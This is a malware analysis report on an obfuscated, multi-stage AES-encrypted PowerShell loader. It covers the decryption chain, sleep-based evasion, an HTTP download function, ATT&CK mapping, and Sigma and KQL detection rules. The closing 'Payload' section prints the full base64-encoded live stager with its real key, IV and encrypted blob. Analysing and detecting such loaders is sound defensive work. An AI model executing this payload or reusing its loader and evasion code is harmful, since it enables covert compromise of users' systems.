# Multi-Stage AES Encrypted PowerShell Loader Analysis

## Overview

This document details the analysis of a heavily obfuscated PowerShell command identified during investigation. The script leverages AES encryption, multiple layers of payload staging, PowerShell in-memory execution, and network communication capabilities to retrieve and execute additional content.

Based on the observed behavior, the script exhibits characteristics commonly associated with malware loaders, ClickFix-style attacks, and staged payload delivery frameworks.

---

# Initial Execution Command

The PowerShell execution chain starts with the following components:

```powershell
$k61ba = [System.Convert]::FromBase64String(...)
$i9da7 = [System.Convert]::FromBase64String(...)
$eafb0 = [System.Convert]::FromBase64String(...)

$a7787 = New-Object System.Security.Cryptography.AesManaged
$a7787.Key = $k61ba
$a7787.IV  = $i9da7

iex(
    [System.Text.Encoding]::UTF8.GetString(
        $a7787.CreateDecryptor().TransformFinalBlock(
            $eafb0,
            0,
            $eafb0.Length
        )
    )
)
```

---

# Attack Flow

```text
Base64 Encoded Data
        │
        ▼
AES Key + IV Decoding
        │
        ▼
AES Payload Decryption
        │
        ▼
UTF8 Conversion
        │
        ▼
Invoke-Expression (IEX)
        │
        ▼
Second Stage PowerShell
        │
        ▼
Additional AES Payloads
        │
        ▼
HTTP Requests
        │
        ▼
Payload Download
        │
        ▼
Execution / Persistence
```

---

# Stage 1 Analysis

## Purpose

The first layer performs:

1. AES key decoding
2. AES payload decryption
3. In-memory execution

No payload is initially written to disk.

## AES Configuration

### Key

```text
32 Bytes
```

Equivalent to:

```text
AES-256
```

### IV

```text
16 Bytes
```

### Cipher Mode

Most likely:

```text
AES-CBC
```

Based on the implementation of:

```powershell
System.Security.Cryptography.AesManaged
```

---

# Layer 1 Decryption Results

After decrypting the initial payload, several additional encrypted elements were identified.

## Discovered AES Blobs

```powershell
$u2b476k
$u2b476i
$u2b476e

$u49de2k
$u49de2i
$u49de2e
```

Each group contains:

| Variable | Purpose |
|-----------|-----------|
| *k | AES Key |
| *i | AES IV |
| *e | Encrypted Payload |

This indicates the payload contains multiple decryption stages.

---

# String Obfuscation

The author intentionally avoided storing strings directly.

## Example

```powershell
$n47ca='Op'+'en'
$n9bc2='Se'+'nd'
$n4f32='Re'+'sponseBody'
$n2f51='WriteA'+'llBytes'
```

Resolved values:

```text
Open
Send
ResponseBody
WriteAllBytes
```

## Purpose

This technique is designed to:

- Evade static analysis
- Reduce signature effectiveness
- Complicate IOC extraction
- Bypass simple PowerShell detections

---

# Network Function Creation

A function is built dynamically within the decrypted payload.

```powershell
$nb56b = {
    param($u)

    $wc.Open('GET',$u,0)
    $wc.Send()
    $wc.ResponseBody
}
```

## Purpose

Performs:

```text
HTTP GET Request
```

and returns:

```text
Raw Content From Remote Server
```

---

# Delayed Execution

The payload intentionally pauses before continuing execution.

```powershell
Start-Sleep -Seconds 16
```

## Common Adversary Objectives

### Sandbox Evasion

Many sandboxes only observe processes for a short duration.

### Behavioral Detection Evasion

Delays network activity until after initial inspection.

### Payload Synchronization

Allows remote operators additional time.

---

# Additional Decoded Content

## Base64 String

```powershell
d2FyZGVu
```

Decoded value:

```text
warden
```

## Possible Significance

The value may represent:

- Campaign identifier
- Operator keyword
- Internal payload label
- Decryption reference

Further stages would be required to determine its exact role.

---

# Observed Techniques

## Encryption

### AES Protected Payload

```text
AES-256
```

used to conceal embedded PowerShell.

### Benefits To The Attacker

- Prevents signature matching
- Delays analyst understanding
- Defeats simple file scanning

---

## In-Memory Execution

### Technique

```powershell
Invoke-Expression (IEX)
```

### Benefits To The Attacker

- No executable dropped to disk
- Reduced forensic artifacts
- Bypass file-based AV signatures

---

## Multi-Stage Payload Delivery

### Observation

The initial AES payload decrypts additional AES payloads.

### Advantages

- Layered defense evasion
- Payload replacement flexibility
- Smaller initial stager

---

## HTTP-Based Delivery

### Observation

PowerShell dynamically creates web requests.

### Expected Next Steps

Potential retrieval of:

- PowerShell scripts
- DLL files
- EXE payloads
- Configuration files
- Shellcode

---

# Threat Assessment

## Risk Level

```text
HIGH
```

## Reasoning

The sample demonstrates:

✅ Encryption

✅ Runtime decryption

✅ PowerShell execution

✅ Dynamic code execution

✅ String obfuscation

✅ Sleep-based evasion

✅ Network communication functionality

✅ Multi-stage architecture

These behaviors are strongly aligned with malware delivery frameworks.

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|------------|-----------|
| PowerShell | T1059.001 |
| Command and Scripting Interpreter | T1059 |
| Obfuscated Files or Information | T1027 |
| Deobfuscate/Decode Files | T1140 |
| Encrypted Payloads | T1027.013 |
| Ingress Tool Transfer | T1105 |
| Dynamic Payload Execution | T1620 |

---

# Threat Hunting Opportunities

## PowerShell Analytics

Search for:

```text
AesManaged
CreateDecryptor
TransformFinalBlock
Invoke-Expression
FromBase64String
```

---

## Process Analytics

Look for:

```text
powershell.exe
pwsh.exe
```

launching:

```text
cmd.exe
rundll32.exe
regsvr32.exe
mshta.exe
wscript.exe
```

---

## Network Analytics

Search for outbound connections initiated by:

```text
powershell.exe
```

especially shortly after:

```powershell
Start-Sleep
```

execution.

---

# Detection Opportunities

## Sigma Keywords

```yaml
selection:
  CommandLine|contains:
    - "AesManaged"
    - "CreateDecryptor"
    - "TransformFinalBlock"
    - "Invoke-Expression"
    - "FromBase64String"
```

---

## Elastic KQL

```kql
process.name : "powershell.exe" and
process.command_line.text :
(
  "*AesManaged*" or
  "*CreateDecryptor*" or
  "*TransformFinalBlock*" or
  "*Invoke-Expression*"
)
```

---

# Investigation Recommendations

## Endpoint

Review:

- PowerShell Operational Logs
- Sysmon Events
- SentinelOne Telemetry
- Microsoft Defender Telemetry

### Important Event IDs

```text
4103
4104
1
3
7
11
22
```

---

## Network

Identify:

- Destination IPs
- URLs
- User-Agent values
- Downloaded payloads

---

## Memory Analysis

Capture memory from impacted endpoints if available.

Look for:

```text
Decrypted PowerShell
Downloaded Scripts
Injected Payloads
```

---

# Conclusion

The analyzed sample is a multi-stage AES-encrypted PowerShell loader utilizing runtime decryption, in-memory execution, delayed execution, string obfuscation, and HTTP download functionality.

The first stage decrypts and executes a second-stage PowerShell script which introduces additional encrypted payloads and web request functionality, indicating preparation for further payload retrieval and execution.

Given the observed behavior, the activity should be treated as malicious until proven otherwise. Additional decryption of the remaining embedded AES payloads would likely reveal the final objective, infrastructure, and payload delivery mechanism used by the actor.


# Payload
JGs2MWJhPVtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ3FZQXkxVndPS3o0RHVtem9nWVJBK2UrSGdLVTJiZ21xcXl2TVZUbnpzcW89Jyk7JGk5ZGE3PVtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ3h1enl4SGs0eGJZVUwwMEROdDFiNFE9PScpOyRlYWZiMD1bU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkSWhPcjA2dktXUFZDY0RPVW43Wk5lU21tRFI5YXduOWg2Y0Zycm56NDNEQWpzaXJQNG12VFllRXJQUzVXbGllcXFrbzc0SGlpU2VOSHIwTXpEOWxnNlFjeU1VNUtnbDZNbk1McFQxZHdvT3NBV3gxZjk0Nk1hUzdVWXA2NCsrYURUaHNWdXhFQ0RhdXZtMFd0VUhsalRDUmJ0cWFtVmdMcUdCZDVLWitCd0ZKVkFoSkNOTEszbXFhK3J2RWRvOFYxbGRDQlRLSWhINTNyOXBGZnJBajlCZmNqREVBRTJJZXNGQ2g1R3RpOVc5OXB4UE5PZ3Npd0R5VTJ1dStzY0E4bng4YTNJaTlKTEloREhrSEwrZVV1aEwrWE1TUEJjY2VUK1JvcVJMWDhCWlBTTHg1SjhsOFpXUmhTcmpBTmM1WFNRaDFPQ2szNEFJam1BM1BEbHJaTlhkWXl1NGZSZ1cwdGJablROSEhOdCtyaEQ5TEVLWDhSZW4rbEsxRjh0dzRyeGpHbGEzNmZ5Q2p0ckIzd3JjVUJSSTlYSUQ3eHZNMFFMeG1CcmczMWtXSVF2ZVJZcFdGN05KSCtRY0xPRDEzOGkrZHIzK2VHOVk1dTRsWmJkMDh1Y0NvYXR4SW95b0hVZklXazN3eUV1YmttYUIxQ1RWTFc5TE05M0U4OWFFODNXQkV5UkdNbWR3SmRsakZCRExSN0pSWDZLS1NibGFEU3g4YzYrQll2ZnVQSHlOSlJFUTMyOXhvK2Z6cy9nbjRGY0I5bWVGeHVzV1o0blp3NGhGN1dEQ2FpOE5iUFFWdjA5QzdxeVpoM3JWcjBTZHMvTGsrWEYwai9RQ3o5TDhnMG53RGUvREJ2WHVkcEtLZ3VsNjFWR21jM3psMUtoWldyL0l6V1RVOE9nekpqY0tLRDZNaElEYmZmWHZ2VkxoSnhDMGdDaEtqNDJIaHZHazFJZTBKRXRJUTFQVmtaNy9DUkU4UUUwQnBsbHByOTZWYWlBV1RVWmJQSm1qbC9ySkF4V2UrdlVTZW5CUE1MTDM2N0h2dDkwWk5iQWxiMmVvMG9mZUp3TFB6bFg5eHF2cHd3MzJSMG9QRUI4Z0ZERkw4MXB3ekpGT29qNlUvT3lkYUhyaVU2eTRJNWRNbGF5ZDNOYW1JaDJ0YjNKcFBucFA1Q202MmxQQ0t2cWNkRmVuUDdZbXJ0K0NrTmxWNTEzY0dFM3hkSHR4NjBwaDJGaEoxMmhHdEo2YVhLejNvRVRNTm1tNWQwS0VmRW41MVE5OG9PNW05UlpWTTNPS0VuS0xKV1k3Q2h3KytKSEc2bmdUaEVOWVlDeGFmYXZVdzgyYXRqNm5SMVNOaC9ESHZqdVlDM0FxUGRsU2JLTlFuSlRPWEZLV2tMb3BwbUZ1Smp2cEhVRzZGN09vc2FKUXZmR1daaFNLekwrMmYzb2loanJXZFRUanVLQkh1NEQ5SUNsaS9tdjM1aTU0YnpUZWZvYWRrMnpMN3lPV2RDdXcyRHIzL0tURU1iTUg1RzhHZ01qVGlhYXpObDJZcmpUUkxNV20yQmMvU3BWOUFkS0lKbi83NUdyaHRiTlFsRjRITVhUVGZJMnkxeFlGL3FzenZ3Vk9CcExDaVExQmxNRVFYbWdTNEI4bFZGK0ZMMHVDTm8vUWcrUExlVmRDTUVDLzJjeWVvRVNjNTBlYnFOeEx1azZPN1RmYWRBZUtmWVlHQ1NTUHFMMi9UVEdGMjl2Qi9XblVnVXNOcHNDb3orZHN2TEgzVWlKbmw4bXZuZGtUT2JRNnB1VCtXMXFYZHgrZFZyRU1uQjR1dmIwVkNLbEE1UC8vZWV0c1ZsQmJrbjUrTFhCVnFBNkF4dmRMeENHMWYranlmQlRPc1o0d3VRTkw5SzgwUmk4bXFib2xGRXAzTU5YWUVrM1V0YTFkNVIyeEhkM3dVM2ZuWkVpTTlqM3EyVmFCUVQyOCt0UFlkV3AvT3ZKN2RYaGU0SEpPVHpOSGkzWStpKzIvWU9saEtjM1AwOEFDNDhhY25EWithK1BJOFI5V0E1bzk2ZWI0b3RraFlGTnFBTjZLUSt5M3VOWXJvTWM5RllKbCtWaE9uVkJNYTlpc1g2b2Y1cnNQSzdLQm1FVnQ5VzhGSWRncHBMVTJReENLN0U4TXVpOVN0RjhlRTdvejRFaFlWNjl2ZkJpTUJQRFZOWDR1dVdwZHhDWEFXQXJTdHA0Q2xNRjN6Q3FBQmU3WFJTcnFwcHNkOTdTUTlhUVc1cDNVa25LanhUbXFUS21tTkxlK09oVlBNbUhwVmd4aDVEdk9KRGNSd293N1ZFMFRyVzVpQ0Z4V1d0clRodUhuM1ZIRU4rcGlYVGZ1OVhPdWVsVVhBejRGOTRON1hyam1PUDUyMmwxVk1LYjVxZGMxNjZXR21GUXBDWkgwZTlJd2wzVHdtcGZBd2pNVW5Pc1ZidXFMUEpHeFdQS0JxdUl4YkxaekxxOWpZN2pZbjV3MEJvaXdZRGFKZE5WUjdsSjR3SGJONkR5WHM1SHUxQllvY20xNkRMWlRoU0lPbUJINW1NYzM2SkU5WUM5ckdsK2pmOVZRNngzSG5OTC9yRlRXYVdpRG5LcHJtcE9YN2ZaQTgzUFM2VG92TGxzQkRIR2xlVk9Lb3ptR0dQVTZtSndJK25DUjdoRVp0L05VaUpPWks2Z2JFamtlNzc1UjNjVGZDSTcrcTdYL2dKSUZGQU56VTVwc09ZWVoxU3F4L0ZHK3E4dStPN3FGZG1vZ1FoTWY4WG5wbzZ0bHNPM0lPVGMyMVJzTjRHOWdCOE85RWxEanlEVjRmZDUxTU5zVHhsbkF5Z2g1bHFjNktJV2dCcWpHL3Jza2tsQzNOa3lQOHdrK2FoNXZ5ZHNtMVZTS3JoaGlGem5xbFhFUWtEUzdJelhJYWs3N05rNm1WN1h0WTVOZ2J3QnFSSlNiYUJWdTFTSStNSm9Ec2dDbEJYOHlsZ2RmcWppbHYwWE1OcFRqZUh2TlBGVDAwTS81MEZueWQ4T1BZR0FrbDVsNzRzQVBRT25hamc4dkkxMWlrWGl2RXJ5NW5hS0NsRlRFdm0yVnlRU0cydlFvUlNORXhWaUhKU09kU1ErYzYzOUhGZkdSQkVNbVQ4TlMyejl6WXhSRkl4aFlrMkIwdHFFWDdHaWtmM3EvN3pLdzRvYTlaTklCRDlwNHFjZlo2Zy80cXcyRm10VVJYcldGVVdKbWNnUTJGdUQ0d0k1MnlramhKTkc5Y2lBSW42bjMvR21qbHY5aFlSVG04Z3gySU01WmZHeGpwQ0pWL212NG5oQWpENzkwRWtqS3RDZ0ovcklOWmFVU2ZKUHZEeHAybldjT0M1UlFVenpKU0NVRTRPTlR2RGlUQkkrRW0wMTlRbDB1YXNVVVpsb25MOHVtMEw5NzFnZnZ0N3dpTWJZNHM5MzhES2xJVUpIdi9Oc29hSjUySFZmRCtOdEZFVExaUS9MTDlQcTFzVVcvQ2JSc0Y3QmVkL0NrNXI3akFINkc3UHA2NEFZNTN5dldMZE5tOTlpdTUxNzRnYjlOK3NqckhZTW4xeUM0TkljeVYvekZNQm5IVnIwSVR3bHJ3ZjBKYW8wMlhFV1RtYk5XRVlIU0J6c0RIOXAvNjA0T01VbzRkYURzZHpwblRmNVc3aHM5aENCVEg3R0FuSUtOZG1XWjZaQ3FTeUZpM1ZDdlhBZWdKSE1tZTcxUG9WV3hOT2kzZlgvVkxRWGNOOEVTRFFCVDhGMk5zenNESEdsOTlCSjAyK3RVampXU3hTaWJtVi9OQWgveHVnRW9hWUpFeC9LeGZacnZ3ellZbWxNL1lSbzlkblVWSVJhQXp0VnBlNTFtMEprbmE1YWZsK1V0cmJrc090SE1SR1F0c2pCdjNQdGprUkg1czVrUkphTEVOMzRmYW9lVzN4TksxUUJGc25NcDBEcU1KUFNnREsyc0Uxc2FPM2tDbTF5YmhheFF4UTJncVoxQkZVeTllUCtSQjJhb2pUdytjT0NjSDZ0RE5mNzNlRlEwaU1KWXYwbkpscVBncGNXVm91V0QrWUYwOG5RQ1N4dHI2N3ZPdENrMjIvUEx1NWpOcENCYVc2MkwxSVR0UkZpMDJkRmt1bXIweklFYm91cXoyTERyM2ZaUFdIL1R2WkhuVWJ4Z1lueG5RUnU1UGN4Mk9DblJQdW81OTRIOWdnb0t6YUNpSGE2RkNmSHliWVp5Z3R4anBVMmI3R3RUUUxQZGtGZUR6TWlielJpS3JUemFuQXJXOGZwclh1anI3VWhKRnJEblFLZVM1dHBQMExLbGx5bjNiVkF5bEMyMVB0RjBEMFFOQ1lkYU96Nld5ZGdXV21mUVI1amh0UGNoSVBnalZOOUJJbmZFZ0FsRW4zZEk1UkozY0F6YzY0cFJLL3JCZVVxeTNtMDVLNXQ0UE8vbW9RVnJSd1lKbTdKbjRyQTlGZ0o0ZFdTRzBQRGZMMHNHWGdueW1TWXJHcjZ4R2Irb3JKYlRpM3djUml3dFdGZEhjWFdrVXRnZkxlcUY0S0l5dUhBcXVrdTd4NytqWXVnbGtORzNYbFhTR3VCSlZhWkUyandJclhGbmYyQ0xjVXFzODNnWXZ4RUlwcVB5dkFmZ1ZmNXVpblhWbHVsdksvU1BJMzFKcEpaclhDV2JLTG04YjgydCtOVUZhbnlWR3lDcldjVHMzbzE1R2loeFBPcFZSSGlpWnBxVU5TQXRncVhaM2l3bktkMXZtTVVrRGVOQnBiY1FFbGZwaHRVTXIzNldaSjJZcjBibEd0RHdyWFNLNE5DMGJZOS9rTWRWV2dHTmh6TkNSQmQ2dXJMeWY3UDNXWk5hNDVVUEsybm9kN09IRThVWTdXTS9xb2xWSzQwdEl4WHZrcXUxVVFVRzJFSDJibWZaRVlVd0dqU3g1WU1lTHhnUFFsczRGRE9yQXVsZ0hNLzY3KzFzOEIzU3BTVElkYmloSDk0aVl4Z3JLeC9CeFovOD0nKTskYTc3ODc9TmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc01hbmFnZWQ7JGE3Nzg3LktleT0kazYxYmE7JGE3Nzg3LklWPSRpOWRhNztpZXgoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGE3Nzg3LkNyZWF0ZURlY3J5cHRvcigpLlRyYW5zZm9ybUZpbmFsQmxvY2soJGVhZmIwLDAsJGVhZmIwLkxlbmd0aCkpKQ

